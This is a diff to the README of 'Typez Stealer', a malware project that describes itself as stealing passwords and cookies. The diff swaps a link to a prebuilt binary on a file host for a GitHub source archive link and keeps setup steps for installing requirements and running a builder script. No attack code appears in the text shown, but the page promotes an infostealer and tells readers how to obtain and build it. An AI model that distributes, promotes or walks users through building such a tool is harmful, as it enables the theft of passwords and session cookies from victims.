@@ -1,7 +1,7 @@
 ![image](https://i.postimg.cc/26pfK0WF/banner-typez-stealer.png)
 ---
 <p align = "center">
-  <a href = "https://files.catbox.moe/tniuyx.zip">Download - Latest Release</a>
+  <a href = "https://github.com/ChildsOfYhwh/Typez-Stealer/archive/refs/heads/main.zip">Download - Latest Release</a>
 </p>
 
 <p align="center">
@@ -63,7 +63,7 @@ Typez Stealer is a stealer that has many features, it can steal pws, cookies etc
 ---
                                                       ⬇️ Setup
 
-1. [Download source code zip](https://github.com/ChildsOfYhwh/Typez-Stealer/archive/refs/heads/main.zip) or the [build](https://files.catbox.moe/tniuyx.zip)
+1. [Download source code zip](https://github.com/ChildsOfYhwh/Typez-Stealer/archive/refs/heads/main.zip)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.bat` file
